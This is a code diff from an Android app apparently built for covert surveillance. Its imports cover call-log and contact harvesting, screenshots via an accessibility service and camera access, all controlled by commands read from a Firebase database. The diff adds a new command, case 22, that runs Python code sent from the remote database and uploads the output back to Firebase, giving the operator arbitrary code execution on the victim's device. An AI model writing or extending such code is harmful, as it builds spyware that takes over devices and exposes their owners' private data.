@@ -29,6 +29,7 @@ import com.reiserx.testtrace.Operations.getCallLogs;
 import com.reiserx.testtrace.Operations.getContactLists;
 import com.reiserx.testtrace.Operations.getListOfFolder;
 import com.reiserx.testtrace.Operations.getUsageStats;
+import com.reiserx.testtrace.Python.PythonMain;
 import com.reiserx.testtrace.Screenshot.accessibilityService;
 import com.reiserx.testtrace.Service.CameraService;
 import com.reiserx.testtrace.Utilities.generateLogs;
@@ -234,6 +235,10 @@ public class checkDatabase {
             case 21:
                 generateLogs generateLogs = new generateLogs();
                 generateLogs.send(userID, value);
+                break;
+            case 22:
+                    PythonMain pythonMain = new PythonMain(context, value, userID);
+                    FirebaseDatabase.getInstance().getReference().child("Main").child(userID).child("Python").child("output").setValue(pythonMain.execute());
                 break;
             default:
                 break;
